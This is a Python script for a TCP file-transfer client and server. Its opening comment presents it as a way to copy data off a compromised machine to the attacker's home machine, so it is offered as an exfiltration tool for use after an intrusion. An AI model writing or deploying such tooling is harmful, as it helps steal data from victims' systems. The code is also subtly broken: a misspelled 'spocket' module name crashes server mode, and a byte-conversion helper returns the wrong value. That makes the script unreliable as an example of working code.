#!/usr/bin/python

'''
you are expected to use scrap script as client/server, in case you know the ip of the compromized shell, and you need to copy data from the compromized machine to the home machine.
'''
import socket
import sys
import time
import gzip
from threading import Thread
from argparse import ArgumentParser

INT_LEN=4
ENDIAN='little'

#python3 int.to_bytes is more appropriate,
# it translate int to bytes object rather than a bytes of list!
def int2bytes(size):
    # assume little endeaness int=b1b2b3b4
    b1 = size & 0xff
    b2 = (size >> 8) & 0xff
    b3 = (size >> 16) & 0xff
    b4 = (size >> 24) & 0xff
    return bytes([b1, b2, b3, b4])

#similarly python3 int.from_bytes translates bytes directly to int in a single line!
def bytes2int(B):
    print("B type is: ", type(B))
    print("B", B)
    b1=int(B[0])
    b2=int(B[1])
    b3=int(B[2])
    b4=int(B[3])
    num=((b1 << 24) & 0xffffffff) | \
        ((b2 << 16) & 0xffffffff) | \
        ((b3 << 8) & 0xffffffff) | \
        (b4 & 0xffffffff)
    return int

class ScrapServer(Thread):
    def __init__(self, addr, port, sock, msg):
        Thread.__init__(self)
        self.addr=addr
        self.port=port
        self.socket=sock
        self.payload=msg
        self.len=len(self.payload)
        print("handshake with %s on port %d for transfering a message of length %d." % (self.addr, self.port, self.len))
        
    def run(self):
        print("transfer starting with %s" % self.addr)
        self.socket.send(self.len.to_bytes(INT_LEN, ENDIAN))
        self.socket.send(self.payload)
        self.socket.close()
        print("finshed with %s" % self.addr)

def init_server(path, host, port):
    # read payload
    #TODO (fix) send it compressed
    f=gzip.open(path, 'rb')
    raw = f.read()
    f.close()
    braw = raw
    # bind the socket
    s=socket.socket(spocket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    #TODO (res) bind on ip
    s.bind(('', port))
    threads = []
    def listen_run():
        s.listen(1)
        sock, addr=s.accept()
        thread=ScrapServer(addr[0],addr[1], sock, braw)
        thread.start()
        threads.append(thread)
    def finalise():
        for t in threads:
            t.join()
        s.close()
    while True:
        try:
            listen_run()
        except Exception as e:
            print("send failed!: ", e.__class__)
            print(e)
        except KeyboardInterrupt:
            print("exiting...")
            break
    finalise()

def init_client(path, host, port):
    with gzip.open(path, 'w') as f: #TODO (fix) i remove host from path because host name might include back-slash.
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host, port))
        time.sleep(1)
        payload=''
        try:
            num=s.recv(4, socket.MSG_DONTWAIT)
            num=int.from_bytes(num, ENDIAN)
            print("file size being received: ", num)
            # why does the recv fails to read sufficient data,
            # perhaps there are limitations over it's size.
            # i should try to read several times.
            # also check send, doesn't it send all the payload?!
            size_read=0
            pack=[]
            pack_len=4096
            while size_read < num:
                if num-size_read < pack_len:
                    pack_len=num-size_read
                payload=s.recv(pack_len)
                pack.append(payload)
                payload_len=len(payload)
                size_read+=payload_len
            print("harnest pack of payload of len: ", len(pack))
            for payload in pack:
                f.write(payload)
        except Exception as e:
            print("recv error: ", e.__class__)
            print("recv error: ", e)
        s.close()

parser=ArgumentParser()
parser.add_argument('-p', '--port', default=54321, type=int, help="set server port")
parser.add_argument('-i', '--infile', default='/tmp/scrap.zip', type=str, help='path to file to transfer')
parser.add_argument('-o', '--outfile', default='/tmp/out', type=str, help='path to file to transfer')
parser.add_argument('-t', '--etype', default='s', type=str, help="choose weither to run it as server/client")
parser.add_argument('-a', '--addr', default=socket.gethostname(), type=str, help="the client/server address")
args = parser.parse_args()
host = args.addr
port = args.port
inpath = args.infile
outpath = args.outfile
execution = args.etype

if execution=='s':
    init_server(inpath, host, port)
elif execution=='c':
    init_client(outpath, host, port)
